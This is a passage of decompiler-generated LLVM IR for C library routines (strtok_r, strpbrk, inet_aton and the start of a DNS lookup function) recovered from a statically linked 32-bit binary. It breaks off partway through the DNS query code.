  br i1 %v2_100121f0, label %dec_label_pc_100121f0.dec_label_pc_100121f4_crit_edge, label %dec_label_pc_100121f0.backedge.dec_label_pc_1001217c_crit_edge

dec_label_pc_100121f0.backedge.dec_label_pc_1001217c_crit_edge: ; preds = %dec_label_pc_100121f0.backedge
  %v0_1001217c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10012180.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10012184.pre = load i32, i32* @r7, align 4
  %v0_1001219c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1001217c

dec_label_pc_100121f0.dec_label_pc_100121f4_crit_edge: ; preds = %dec_label_pc_100121f0.backedge
  %v0_100121f4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100121f4

dec_label_pc_100121f4:                            ; preds = %dec_label_pc_100121f0.dec_label_pc_100121f4_crit_edge, %dec_label_pc_10012154
  %v0_100121f4 = phi i32 [ %v0_100121f4.pre, %dec_label_pc_100121f0.dec_label_pc_100121f4_crit_edge ], [ %v0_10012158, %dec_label_pc_10012154 ]
  %v1_100121f4 = add i32 %v0_100121f4, 1
  store i32 %v1_100121f4, i32* %r5.global-to-local, align 4
  store i32 %v0_100121f4, i32* %ctr.global-to-local, align 4
  %v2_1001220c3 = icmp eq i32 %v0_100121f4, 0
  br i1 %v2_1001220c3, label %dec_label_pc_10012210, label %dec_label_pc_10012200

dec_label_pc_10012200:                            ; preds = %dec_label_pc_100121f4, %dec_label_pc_10012200
  %v0_10012200 = load i32, i32* %r3.global-to-local, align 4
  %v1_10012200 = add i32 %v0_10012200, -1
  %v2_10012200 = inttoptr i32 %v1_10012200 to i8*
  %v3_10012200 = load i8, i8* %v2_10012200, align 1
  %v4_10012200 = zext i8 %v3_10012200 to i32
  store i32 %v1_10012200, i32* %r3.global-to-local, align 4
  %v1_10012204 = load i32, i32* %r4.global-to-local, align 4
  %v4_10012204 = icmp eq i32 %v4_10012200, %v1_10012204
  %v0_10012208 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012204, i32 %v0_10012208)
  %v0_1001220c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001220c = add i32 %v0_1001220c, -1
  store i32 %v1_1001220c, i32* %ctr.global-to-local, align 4
  %v2_1001220c = icmp eq i32 %v1_1001220c, 0
  br i1 %v2_1001220c, label %dec_label_pc_10012210, label %dec_label_pc_10012200

dec_label_pc_10012210:                            ; preds = %dec_label_pc_10012200, %dec_label_pc_100121f4
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1001220c, { 1, 0 }
  uselistorder i32 %v0_100121f4, { 1, 2, 0 }
  uselistorder i32 %v1_100121f0, { 2, 1, 0 }
  uselistorder i32 %v1_100121a0, { 1, 0, 2 }
  uselistorder i32 %v1_10012198, { 1, 0, 2 }
  uselistorder i32 %v1_10012188, { 1, 0, 2 }
  uselistorder i32 %v2_1001215c, { 1, 0 }
  uselistorder i32 %v1_10012158, { 1, 0 }
  uselistorder i32 %v0_10012154, { 1, 0 }
  uselistorder i32 %v0_10012158, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1001214c, { 1, 0 }
  uselistorder i32 %v0_10012148, { 1, 0, 2 }
  uselistorder i32 %v2_10012130, { 2, 0, 1, 3 }
  uselistorder i32 %v1_10012128, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 3, 2, 4, 6, 7, 5, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 7, 8, 1, 3, 4, 2, 5, 6 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10012200, { 1, 0 }
  uselistorder label %dec_label_pc_1001217c, { 1, 0 }
  uselistorder label %dec_label_pc_10012150, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_1001221c = load i32, i32* @lr, align 4
  store i32 %v0_1001221c, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_10012224 = icmp eq i32 %arg1, 0
  %v0_1001222c = load i32, i32* @r5, align 4
  store i32 %v0_1001222c, i32* %r30.global-to-local, align 4
  %v0_10012230 = load i32, i32* @r4, align 4
  store i32 %v0_10012230, i32* %r29.global-to-local, align 4
  br i1 %v3_10012224, label %dec_label_pc_10012238, label %dec_label_pc_1001223c

dec_label_pc_10012238:                            ; preds = %entry
  %v1_10012238 = inttoptr i32 %v0_1001222c to i32*
  %v2_10012238 = load i32, i32* %v1_10012238, align 4
  store i32 %v2_10012238, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001223c

dec_label_pc_1001223c:                            ; preds = %entry, %dec_label_pc_10012238
  %v0_1001223c = phi i32 [ %arg1, %entry ], [ %v2_10012238, %dec_label_pc_10012238 ]
  store i32 %v0_1001223c, i32* @r3, align 4
  %v1_10012240 = inttoptr i32 %v0_1001223c to i8*
  %v2_10012240 = call i32 @__GI_strspn(i8* %v1_10012240)
  %v0_10012244 = load i32, i32* %r29.global-to-local, align 4
  %v0_10012248 = load i32, i32* %r31.global-to-local, align 4
  %v2_10012248 = add i32 %v0_10012248, %v2_10012240
  %v3_10012248 = inttoptr i32 %v2_10012248 to i8*
  %v4_10012248 = load i8, i8* %v3_10012248, align 1
  store i32 %v2_10012248, i32* @r31, align 4
  store i32 %v2_10012248, i32* @r3, align 4
  %v3_10012254 = icmp eq i8 %v4_10012248, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10012254, label %dec_label_pc_10012260, label %dec_label_pc_10012268

dec_label_pc_10012260:                            ; preds = %dec_label_pc_1001223c
  %v1_10012260 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012260 = inttoptr i32 %v1_10012260 to i32*
  store i32 %v2_10012248, i32* %v2_10012260, align 4
  br label %dec_label_pc_100122a0

dec_label_pc_10012268:                            ; preds = %dec_label_pc_1001223c
  store i32 268509804, i32* @lr, align 4
  %v3_10012268 = call i32 @__GI_strpbrk(i8* %v3_10012248, i32 %v0_10012244)
  %v4_10012270 = icmp eq i32 %v3_10012268, 0
  %v0_10012274 = load i32, i32* @r31, align 4
  store i32 %v0_10012274, i32* @r3, align 4
  %v2_10012278 = add i32 %v3_10012268, 1
  store i32 %v2_10012278, i32* %r11.global-to-local, align 4
  br i1 %v4_10012270, label %dec_label_pc_10012280, label %dec_label_pc_10012290

dec_label_pc_10012280:                            ; preds = %dec_label_pc_10012268
  store i32 268509828, i32* @lr, align 4
  %v4_10012280 = call i32 @rawmemchr(i32 %v0_10012274, i32 0, i32 0)
  %v0_10012284 = load i32, i32* @r31, align 4
  store i32 %v0_10012284, i32* %r0.global-to-local, align 4
  %v1_10012288 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012288 = inttoptr i32 %v1_10012288 to i32*
  store i32 %v4_10012280, i32* %v2_10012288, align 4
  br label %dec_label_pc_100122a0

dec_label_pc_10012290:                            ; preds = %dec_label_pc_10012268
  %v1_10012270 = inttoptr i32 %v3_10012268 to i8*
  store i8 0, i8* %v1_10012270, align 1
  %v0_10012298 = load i32, i32* @r31, align 4
  store i32 %v0_10012298, i32* %r0.global-to-local, align 4
  %v0_1001229c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001229c = load i32, i32* %r30.global-to-local, align 4
  %v2_1001229c = inttoptr i32 %v1_1001229c to i32*
  store i32 %v0_1001229c, i32* %v2_1001229c, align 4
  br label %dec_label_pc_100122a0

dec_label_pc_100122a0:                            ; preds = %dec_label_pc_10012280, %dec_label_pc_10012260, %dec_label_pc_10012290
  %v0_100122a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1001221c, i32* %r0.global-to-local, align 4
  ret i32 %v0_100122a0

; uselistorder directives
  uselistorder i32 %v3_10012268, { 2, 0, 1 }
  uselistorder i32 %v2_10012248, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1001223c, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_100122a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001223c, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100122d81 = load i32, i32* @r3, align 4
  %v1_100122d82 = inttoptr i32 %v0_100122d81 to i8*
  %v2_100122d83 = load i8, i8* %v1_100122d82, align 1
  %v3_100122d84 = zext i8 %v2_100122d83 to i32
  store i32 %v3_100122d84, i32* %r11.global-to-local, align 4
  %v3_100122dc6 = icmp eq i8 %v2_100122d83, 0
  br i1 %v3_100122dc6, label %dec_label_pc_100122ec, label %dec_label_pc_100122e4

dec_label_pc_100122bc:                            ; preds = %dec_label_pc_100122c0
  %v3_100122c0 = zext i8 %v2_100122c0 to i32
  %v4_100122cc = icmp eq i32 %v3_100122c0, %v1_100122cc
  %v0_100122bc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100122cc, i32 %v0_100122bc)
  %v0_100122c0.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_100122cc.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100122c0

dec_label_pc_100122c0:                            ; preds = %dec_label_pc_100122e4, %dec_label_pc_100122bc
  %v1_100122cc = phi i32 [ %v1_100122cc9, %dec_label_pc_100122e4 ], [ %v1_100122cc.pre, %dec_label_pc_100122bc ]
  %v0_100122c0 = phi i32 [ %tmp, %dec_label_pc_100122e4 ], [ %v0_100122c0.pre, %dec_label_pc_100122bc ]
  %v1_100122c0 = inttoptr i32 %v0_100122c0 to i8*
  %v2_100122c0 = load i8, i8* %v1_100122c0, align 1
  %v1_100122c4 = add i32 %v0_100122c0, 1
  store i32 %v1_100122c4, i32* %r9.global-to-local, align 4
  %v3_100122c8 = icmp eq i8 %v2_100122c0, 0
  br i1 %v3_100122c8, label %dec_label_pc_100122d4, label %dec_label_pc_100122bc

dec_label_pc_100122d4:                            ; preds = %dec_label_pc_100122c0
  %v0_100122d4 = load i32, i32* @r3, align 4
  %v1_100122d4 = add i32 %v0_100122d4, 1
  store i32 %v1_100122d4, i32* @r3, align 4
  %v1_100122d8 = inttoptr i32 %v1_100122d4 to i8*
  %v2_100122d8 = load i8, i8* %v1_100122d8, align 1
  %v3_100122d8 = zext i8 %v2_100122d8 to i32
  store i32 %v3_100122d8, i32* %r11.global-to-local, align 4
  %v3_100122dc = icmp eq i8 %v2_100122d8, 0
  br i1 %v3_100122dc, label %dec_label_pc_100122ec, label %dec_label_pc_100122e4

dec_label_pc_100122e4:                            ; preds = %entry, %dec_label_pc_100122d4
  %v1_100122cc9 = phi i32 [ %v3_100122d8, %dec_label_pc_100122d4 ], [ %v3_100122d84, %entry ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100122c0

dec_label_pc_100122ec:                            ; preds = %dec_label_pc_100122d4, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_100122c0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100122e4, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_100122f4 = icmp eq i8* %arg1, null
  br i1 %v3_100122f4, label %dec_label_pc_100123ac, label %dec_label_pc_100122fc

dec_label_pc_100122fc:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_10012310.pre = load i32, i32* @global_var_10028578, align 4
  br label %dec_label_pc_1001230c

dec_label_pc_1001230c:                            ; preds = %dec_label_pc_100122fc, %dec_label_pc_10012384
  %v0_10012384 = phi i32 [ 0, %dec_label_pc_100122fc ], [ %v2_1001238c, %dec_label_pc_10012384 ]
  %v0_10012388 = phi i32 [ 1, %dec_label_pc_100122fc ], [ %v1_10012388, %dec_label_pc_10012384 ]
  %v0_1001230c = phi i32 [ %tmp, %dec_label_pc_100122fc ], [ %v0_1001230c3, %dec_label_pc_10012384 ]
  %v1_1001230c = inttoptr i32 %v0_1001230c to i8*
  %v2_1001230c = load i8, i8* %v1_1001230c, align 1
  %v3_1001230c = zext i8 %v2_1001230c to i32
  %v1_10012314 = mul nuw nsw i32 %v3_1001230c, 2
  %v2_10012318 = add i32 %v1_10012314, %v3_10012310.pre
  %v3_10012318 = inttoptr i32 %v2_10012318 to i16*
  %v4_10012318 = load i16, i16* %v3_10012318, align 2
  %v1_1001231c = and i16 %v4_10012318, 8
  %v3_1001231c = icmp eq i16 %v1_1001231c, 0
  br i1 %v3_1001231c, label %dec_label_pc_100123ac, label %dec_label_pc_10012324

dec_label_pc_10012324:                            ; preds = %dec_label_pc_1001230c
  br label %dec_label_pc_1001233c

dec_label_pc_1001232c:                            ; preds = %dec_label_pc_1001233c
  %v1_10012340 = mul i32 %v1_1001238c, 10
  %v2_10012348 = add i32 %v3_1001233c, %v1_10012340
  %v1_1001232c = add i32 %v2_10012348, -48
  %v1_10012330 = add i32 %v0_10012374, 1
  %v2_10012334 = icmp sgt i32 %v1_1001232c, 255
  br i1 %v2_10012334, label %dec_label_pc_100123ac, label %dec_label_pc_1001233c

dec_label_pc_1001233c:                            ; preds = %dec_label_pc_1001232c, %dec_label_pc_10012324
  %v1_1001238c = phi i32 [ %v1_1001232c, %dec_label_pc_1001232c ], [ 0, %dec_label_pc_10012324 ]
  %v0_10012374 = phi i32 [ %v1_10012330, %dec_label_pc_1001232c ], [ %v0_1001230c, %dec_label_pc_10012324 ]
  %v1_1001233c = inttoptr i32 %v0_10012374 to i8*
  %v2_1001233c = load i8, i8* %v1_1001233c, align 1
  %v3_1001233c = zext i8 %v2_1001233c to i32
  %v1_10012344 = mul nuw nsw i32 %v3_1001233c, 2
  %v2_1001234c = add i32 %v1_10012344, %v3_10012310.pre
  %v3_1001234c = inttoptr i32 %v2_1001234c to i16*
  %v4_1001234c = load i16, i16* %v3_1001234c, align 2
  %v5_1001234c = zext i16 %v4_1001234c to i32
  %v1_10012350 = and i32 %v5_1001234c, 8
  %v3_10012350 = icmp eq i32 %v1_10012350, 0
  br i1 %v3_10012350, label %dec_label_pc_10012358, label %dec_label_pc_1001232c

dec_label_pc_10012358:                            ; preds = %dec_label_pc_1001233c
  %v2_10012358 = icmp sgt i32 %v0_10012388, 3
  br i1 %v2_10012358, label %dec_label_pc_10012370, label %dec_label_pc_10012360

dec_label_pc_10012360:                            ; preds = %dec_label_pc_10012358
  %v3_10012360 = icmp eq i8 %v2_1001233c, 46
  br i1 %v3_10012360, label %dec_label_pc_10012368, label %dec_label_pc_100123ac

dec_label_pc_10012368:                            ; preds = %dec_label_pc_10012360
  %v1_10012368 = add i32 %v0_10012374, 1
  br label %dec_label_pc_10012384

dec_label_pc_10012370:                            ; preds = %dec_label_pc_10012358
  %v3_10012370 = icmp eq i8 %v2_1001233c, 0
  %v1_10012374 = add i32 %v0_10012374, 1
  br i1 %v3_10012370, label %dec_label_pc_10012384, label %dec_label_pc_1001237c

dec_label_pc_1001237c:                            ; preds = %dec_label_pc_10012370
  %v1_1001237c = and i32 %v5_1001234c, 32
  %v3_1001237c = icmp eq i32 %v1_1001237c, 0
  br i1 %v3_1001237c, label %dec_label_pc_100123ac, label %dec_label_pc_10012384

dec_label_pc_10012384:                            ; preds = %dec_label_pc_1001237c, %dec_label_pc_10012370, %dec_label_pc_10012368
  %v0_1001230c3 = phi i32 [ %v1_10012374, %dec_label_pc_1001237c ], [ %v1_10012374, %dec_label_pc_10012370 ], [ %v1_10012368, %dec_label_pc_10012368 ]
  %v1_10012384 = mul i32 %v0_10012384, 256
  %v1_10012388 = add nuw nsw i32 %v0_10012388, 1
  %v2_1001238c = or i32 %v1_1001238c, %v1_10012384
  store i32 %v2_1001238c, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_10012388, 5
  br i1 %tmp10, label %dec_label_pc_1001230c, label %dec_label_pc_10012398

dec_label_pc_10012398:                            ; preds = %dec_label_pc_10012384
  %v0_10012398 = load i32, i32* @r4, align 4
  %v3_10012398 = icmp eq i32 %v0_10012398, 0
  %v0_100123a0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10012398, i32 %v0_100123a0)
  %v0_100123a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_100123a4 = load i32, i32* @r4, align 4
  %v2_100123a4 = inttoptr i32 %v1_100123a4 to i32*
  store i32 %v0_100123a4, i32* %v2_100123a4, align 4
  ret i32 1

dec_label_pc_100123ac:                            ; preds = %dec_label_pc_10012360, %dec_label_pc_1001237c, %dec_label_pc_1001230c, %dec_label_pc_1001232c, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1001238c, { 1, 0 }
  uselistorder i32 %v1_10012388, { 1, 0 }
  uselistorder i32 %v0_10012374, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100123ac, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1001230c, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_100123b8 = load i32, i32* @lr, align 4
  store i32 %v0_100123b8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 512, i32* @r3, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268510180, i32* @lr, align 4
  %v0_100123e0 = call i32 @malloc()
  store i32 %v0_100123e0, i32* @r30, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268510192, i32* @lr, align 4
  %v0_100123ec = call i32 @malloc()
  %v0_100123f0 = load i32, i32* @r30, align 4
  %v3_100123f0 = icmp eq i32 %v0_100123f0, 0
  store i32 %v0_100123ec, i32* @r21, align 4
  br i1 %v3_100123f0, label %dec_label_pc_100129ac, label %dec_label_pc_100123fc

dec_label_pc_100123fc:                            ; preds = %entry
  %v3_100123fc = icmp eq i32 %v0_100123ec, 0
  br i1 %v3_100123fc, label %dec_label_pc_100129ac, label %dec_label_pc_10012404

dec_label_pc_10012404:                            ; preds = %dec_label_pc_100123fc
  %v0_10012404 = load i32, i32* @r23, align 4
  %v3_10012404 = icmp eq i32 %v0_10012404, 0
  br i1 %v3_10012404, label %dec_label_pc_100129ac, label %dec_label_pc_1001240c

dec_label_pc_1001240c:                            ; preds = %dec_label_pc_10012404
  %v0_1001240c = load i32, i32* %r14.global-to-local, align 4
  %v1_1001240c = inttoptr i32 %v0_1001240c to i8*
  %v2_1001240c = load i8, i8* %v1_1001240c, align 1
  %v3_1001240c = zext i8 %v2_1001240c to i32
  store i32 %v3_1001240c, i32* %r0.global-to-local, align 4
  %v3_10012410 = icmp eq i8 %v2_1001240c, 0
  br i1 %v3_10012410, label %dec_label_pc_100129ac, label %dec_label_pc_10012418

dec_label_pc_10012418:                            ; preds = %dec_label_pc_1001240c
  store i32 %v0_1001240c, i32* @r3, align 4
  store i32 268632064, i32* %r29.global-to-local, align 4
  %v0_10012420 = call i32 @__GI_strlen()
  %v0_10012428 = load i32, i32* %r14.global-to-local, align 4
  %v2_10012428 = add i32 %v0_10012428, %v0_10012420
  %v1_10012430 = add i32 %v2_10012428, -1
  %v2_10012430 = inttoptr i32 %v1_10012430 to i8*
  %v3_10012430 = load i8, i8* %v2_10012430, align 1
  %v4_10012430 = zext i8 %v3_10012430 to i32
  store i32 %v4_10012430, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002e858.677 to i32), i32* %r29.global-to-local, align 4
  %v2_10012438 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_10012438, i32* %r28.global-to-local, align 4
  store i32 %v2_10012438, i32* @r3, align 4
  %v1_10012444 = xor i32 %v4_10012430, 46
  store i32 %v1_10012444, i32* %r17.global-to-local, align 4
  %v0_10012448 = call i32 @__pthread_return_void()
  %v0_10012450 = call i32 @__pthread_return_0()
  %v3_10012458 = load i32, i32* @global_var_10028618.678, align 4
  store i32 %v3_10012458, i32* %r11.global-to-local, align 4
  %v3_10012464 = load i16, i16* @global_var_10028534.679, align 2
  %v4_10012464 = zext i16 %v3_10012464 to i32
  store i32 %v4_10012464, i32* @r25, align 4
  %v1_10012468 = load i32, i32* @r23, align 4
  store i32 %v2_10012438, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_10012468 = srem i32 %v3_10012458, %v1_10012468
  %v2_10012484 = sub i32 %v3_10012458, %v2_10012468
  store i32 %v2_10012484, i32* %r0.global-to-local, align 4
  store i32 %v2_10012468, i32* @r26, align 4
  %v0_1001248c = call i32 @__pthread_return_void()
  %v0_100129a0.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_100129a0.pr19, 3
  br i1 %tmp57, label %dec_label_pc_10012494.lr.ph.lr.ph, label %dec_label_pc_100129b8

dec_label_pc_10012494.lr.ph.lr.ph:                ; preds = %dec_label_pc_10012418
  %v2_100124ac = ptrtoint i32* %stack_var_-144 to i32
  %v2_100125c0 = ptrtoint i32* %stack_var_-204 to i32
  %v2_10012620 = ptrtoint i16* %stack_var_-212 to i32
  %v2_10012664 = ptrtoint i32* %stack_var_-248 to i32
  %v3_100126c0 = icmp eq i32 %tmp37, 0
  %v3_100126cc = icmp eq i32 %tmp36, 3
  %v2_10012748 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_1001279c = ptrtoint i32* %stack_var_-184 to i32
  %v3_100127c8 = icmp eq i32 %tmp33, 0
  %v3_1001273c = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_10012494.lr.ph

dec_label_pc_10012494:                            ; preds = %dec_label_pc_10012494.lr.ph, %dec_label_pc_10012644
  %v0_10012494 = load i32, i32* @r19, align 4
  %v3_10012494 = icmp eq i32 %v0_10012494, -1
  br i1 %v3_10012494, label %dec_label_pc_100124a4, label %dec_label_pc_1001249c

dec_label_pc_1001249c:                            ; preds = %dec_label_pc_10012494
  store i32 268510372, i32* @lr, align 4
  %v1_100124a0 = call i32 @__libc_close(i32 %v0_10012494)
  br label %dec_label_pc_100124a4

dec_label_pc_100124a4:                            ; preds = %dec_label_pc_10012494, %dec_label_pc_1001249c
  store i32 %v2_100124ac, i32* %r29.global-to-local, align 4
  %v0_100124b0 = load i32, i32* @r30, align 4
  store i32 268510392, i32* @lr, align 4
  %v3_100124b4 = call i32 @__GI_memset(i32 %v0_100124b0, i32 0, i32 512)
  store i32 268510408, i32* @lr, align 4
  %v3_100124c4 = call i32 @__GI_memset(i32 %v2_100124ac, i32 0, i32 48)
  %v0_100124c8 = load i32, i32* @r25, align 4
  %v1_100124c8 = add i32 %v0_100124c8, 1
  %v1_100124cc = urem i32 %v1_100124c8, 65536
  store i32 %v1_100124cc, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_100124d8 = load i32, i32* @r30, align 4
  store i32 %v1_100124cc, i32* %stack_var_-144, align 4
  %v4_100124ec = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_100124d8, i32 512)
  store i32 %v4_100124ec, i32* %r28.global-to-local, align 4
  %v1_100124f0 = icmp slt i32 %v4_100124ec, 0
  br i1 %v1_100124f0, label %dec_label_pc_100129b8, label %dec_label_pc_100124f8

dec_label_pc_100124f8:                            ; preds = %dec_label_pc_100124a4
  %v0_100124f8 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_100124f8, i32* @r4, align 4
  %v0_10012500 = load i32, i32* @r21, align 4
  store i32 268632064, i32* %r29.global-to-local, align 4
  store i32 268510476, i32* @lr, align 4
  %v4_10012508 = call i32 @strncpy(i32 %v0_10012500, i32 %v0_100124f8, i32 1025)
  store i32 ptrtoint (i32* @global_var_10028538.626 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10012438, i32* @r3, align 4
  %v0_10012520 = call i32 @__pthread_return_void()
  %v0_10012528 = call i32 @__pthread_return_0()
  %v0_1001252c = load i32, i32* @r22, align 4
  %v1_1001252c = icmp slt i32 %v0_1001252c, 0
  %v0_10012534 = load i32, i32* @r26, align 4
  %v1_10012534 = mul i32 %v0_10012534, 4
  store i32 %v1_10012534, i32* %r0.global-to-local, align 4
  %v2_10012538 = add i32 %v1_10012534, %arg4
  %v3_10012538 = inttoptr i32 %v2_10012538 to i32*
  %v4_10012538 = load i32, i32* %v3_10012538, align 4
  store i32 %v4_10012538, i32* %r29.global-to-local, align 4
  br i1 %v1_1001252c, label %dec_label_pc_10012580, label %dec_label_pc_10012540

dec_label_pc_10012540:                            ; preds = %dec_label_pc_100124f8
  %v3_10012544 = load i32, i32* @global_var_10028620.681, align 4
  store i32 %v3_10012544, i32* %r0.global-to-local, align 4
  %v2_10012548 = icmp slt i32 %v0_1001252c, %v3_10012544
  br i1 %v2_10012548, label %dec_label_pc_10012550, label %dec_label_pc_10012580

dec_label_pc_10012550:                            ; preds = %dec_label_pc_10012540
  store i32 ptrtoint (i32* @global_var_10017b40.682 to i32), i32* @r4, align 4
  %v0_1001255c = load i32, i32* @r21, align 4
  store i32 268510564, i32* @lr, align 4
  %v4_10012560 = inttoptr i32 %v0_1001255c to i8*
  %v5_10012560 = call i32 @__GI_strncat(i8* %v4_10012560, i32 ptrtoint (i32* @global_var_10017b40.682 to i32), i32 1025, i32 268632064)
  %v0_10012568 = load i32, i32* @r22, align 4
  %v1_10012568 = mul i32 %v0_10012568, 4
  store i32 %v1_10012568, i32* %r0.global-to-local, align 4
  %v2_10012570 = add i32 %v1_10012568, ptrtoint (i32* @global_var_1002e908.683 to i32)
  %v3_10012570 = inttoptr i32 %v2_10012570 to i32*
  %v4_10012570 = load i32, i32* %v3_10012570, align 4
  store i32 %v4_10012570, i32* @r4, align 4
  %v0_10012574 = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10012580.684 to i32), i32* @lr, align 4
  %v4_1001257c = inttoptr i32 %v0_10012574 to i8*
  %v5_1001257c = call i32 @__GI_strncat(i8* %v4_1001257c, i32 %v4_10012570, i32 1025, i32 ptrtoint (i32* @global_var_1002e908.683 to i32))
  br label %dec_label_pc_10012580

dec_label_pc_10012580:                            ; preds = %dec_label_pc_10012540, %dec_label_pc_100124f8, %dec_label_pc_10012550
  store i32 %v2_10012438, i32* @r3, align 4
  %v0_10012588 = call i32 @__pthread_return_void()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10012594 = load i32, i32* @r30, align 4
  %v1_10012594 = load i32, i32* %r28.global-to-local, align 4
  %v2_10012594 = add i32 %v1_10012594, %v0_10012594
  %v1_10012598 = sub i32 512, %v1_10012594
  %v0_100125a0 = load i32, i32* @r21, align 4
  store i32 %v0_100125a0, i32* %stack_var_-240, align 4
  store i32 268510636, i32* @lr, align 4
  %v4_100125a8 = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_10012594, i32 %v1_10012598)
  store i32 %v4_100125a8, i32* @r27, align 4
  %v1_100125ac = icmp slt i32 %v4_100125a8, 0
  br i1 %v1_100125ac, label %dec_label_pc_100129b8, label %dec_label_pc_100125b4

dec_label_pc_100125b4:                            ; preds = %dec_label_pc_10012580
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_100125bc = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268510668, i32* @lr, align 4
  %v3_100125c8 = inttoptr i32 %v0_100125bc to i8*
  %v4_100125c8 = call i32 @inet_pton(i32 10, i8* %v3_100125c8, i32 %v2_100125c0)
  %tmp59 = icmp slt i32 %v4_100125c8, 1
  br i1 %tmp59, label %dec_label_pc_100125dcthread-pre-split, label %dec_label_pc_100125d4

